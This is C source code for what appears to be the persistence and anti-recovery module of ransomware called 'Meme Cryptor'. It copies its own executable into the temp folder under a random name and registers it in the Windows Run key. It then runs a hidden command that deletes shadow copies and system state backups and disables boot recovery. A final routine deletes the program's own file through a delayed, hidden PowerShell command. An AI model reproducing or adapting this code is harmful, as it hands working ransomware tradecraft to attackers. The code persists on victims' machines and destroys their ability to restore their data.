#include "Persistent.h"
#include "Crypto.h"
#include "wbemcli.h"
#include "oleauto.h"

LPCSTR tempFile_path;

int createTemp(HCRYPTPROV hCryptProv) {
	LPSTR lpTemp = (LPSTR)calloc(MAX_PATH, 1);
	BYTE* randomBuffer = (BYTE*)calloc(16, 1);

	int return_val = -1;
	LPSTR lpCurrentFileName = (LPSTR)calloc(MAX_PATH, 1);
	if (!lpCurrentFileName) {
		goto CLEANUP;
	}
	if (!lpTemp) {
		goto CLEANUP;
	}

	if (!randomBuffer) {
		goto CLEANUP;
	}

	if (!GetTempPathA(MAX_PATH, lpTemp)) {
		goto CLEANUP;
	}

	if (!GetModuleFileNameA(0, lpCurrentFileName, MAX_PATH)) {
		goto CLEANUP;
	}

	if (!CryptGenRandom(hCryptProv, 15, randomBuffer)) {
		goto CLEANUP;
	}

	for (int i = 0; i < 15; i++) {
		randomBuffer[i] = (randomBuffer[i] % 26) + 65;

	}
	randomBuffer[15] = 0;
	strcat(lpTemp, (LPSTR)randomBuffer);
	strcat(lpTemp, ".exe");

	if (!CopyFileA(lpCurrentFileName, lpTemp, TRUE)) {
		goto CLEANUP;
	}

	return_val = 0;
	tempFile_path = lpTemp;
CLEANUP:
	if (randomBuffer) {
		free(randomBuffer);
	}
	if (lpCurrentFileName) {
		free(lpCurrentFileName);
	}
	return return_val;
}

int persistRegistry() {
	HKEY hKey;
	if (RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS) {
		return -1;
	}
	if (RegSetKeyValueA(hKey, NULL, "Meme Cryptor", REG_SZ, tempFile_path, strlen(tempFile_path)) != ERROR_SUCCESS) {
		return -1;
	}
	return 0;

}


int environmentSetup() {
	LPCSTR command = "/C wmic SHADOWCOPY DELETE ; wbadmin DELETE SYSTEMSTATEBACKUP ; bcdedit.exe / set{ default } bootstatuspolicy ignoreallfailures ; bcdedit.exe / set{ default } recoveryenabled No";

	if ((int)ShellExecuteA(0, "open", "cmd.exe", command, 0, SW_HIDE) <= 32) {
		return -1;
	}
	return 0;
}

int mainPersist() {
	HCRYPTPROV hCryptProv;

	if (acquireContext(&hCryptProv) == -1) {
		goto CLEANUP;
	}
	if (createTemp(hCryptProv) == -1) {
		goto CLEANUP;
	}

	if (persistRegistry() == -1) {
		goto CLEANUP;
	}

	if (environmentSetup() == -1) {

		goto CLEANUP;
	}

CLEANUP:
	if (hCryptProv) {
		CryptReleaseContext(hCryptProv, 0);
	}
	return 0;
}

void persistCleanUp() {
	if (tempFile_path) {
		free((void*)tempFile_path);
	}

	LPCSTR command = "/C \"powershell -command Start-Sleep -s 2 ; Remove-Item %s\"";

	LPSTR commandBuffer = (LPSTR)calloc(300, 1);

	if (!commandBuffer) {
		return;
	}

	LPSTR fileNameBuffer = (LPSTR)calloc(260, 1); // MAXPATH

	if (!fileNameBuffer) {
		return;
	}

	GetModuleFileNameA(NULL, fileNameBuffer, 260);

	sprintf(commandBuffer, command, fileNameBuffer);
	ShellExecuteA(0, "open", "cmd.exe", commandBuffer, 0, SW_HIDE);
}